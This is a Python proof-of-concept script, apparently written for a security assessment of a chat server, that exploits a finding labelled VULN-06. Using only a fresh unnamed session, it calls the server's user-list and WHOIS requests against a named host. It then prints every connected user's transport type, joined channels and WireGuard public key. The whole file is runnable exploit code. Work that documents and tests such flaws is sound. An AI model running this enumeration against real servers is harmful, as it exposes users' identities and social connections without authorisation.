"""
PoC — VULN-06: Unauthenticated User Enumeration via LIST_USERS + WHOIS

Any authenticated user can:
  1. Call LIST_USERS (request type 14) to retrieve every username currently connected.
  2. Call WHOIS (request type 10) on each to retrieve their transport type and
     every channel they have joined.

No elevated privilege is required. A newly connected user with no username set
can enumerate the full server social graph immediately after CONNECT.
"""
import socket, msgpack, random, time
HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    s.send(msgpack.packb({'request_type': 1, 'request_handle': random.randrange(1, 2**32)}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session']

def req(s, msg):
    s.send(msgpack.packb(msg))
    try:
        return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout:
        return None

def h():
    return random.randrange(1, 2**32)

print('=== PoC: VULN-06 User Enumeration ===\n')

sock, sess = connect()
print('Connected (no username set — bare session)\n')

# Step 1: List all connected users
r = req(sock, {'request_type': 14, 'session': sess, 'request_handle': h(), 'offset': 0})
users = [u.decode() for u in r.get(b'users', [])] if r else []
print(f'Users currently online ({len(users)}):')
for u in users:
    print(f'  {u}')

# Step 2: WHOIS each user — transport type and channel membership
print('\nDetailed profile for each user:')
print(f'  {"Username":<30} {"Transport":<12} Channels')
print(f'  {"-"*30} {"-"*12} -------')
for username in users:
    w = req(sock, {'request_type': 10, 'session': sess, 'request_handle': h(),
                   'username': username})
    if not w:
        continue
    transport = w.get(b'transport', b'').decode()
    channels  = [c.decode() for c in w.get(b'channels', [])]
    pub_key   = w.get(b'wireguard_public_key', b'')
    chan_str  = ', '.join(channels) if channels else '(none)'
    print(f'  {username:<30} {transport:<12} {chan_str}')
    if pub_key:
        print(f'    WireGuard public key: {pub_key.decode()}')
    time.sleep(0.1)

print('\n=== Full server social graph exposed to any connected user ===')
sock.close()
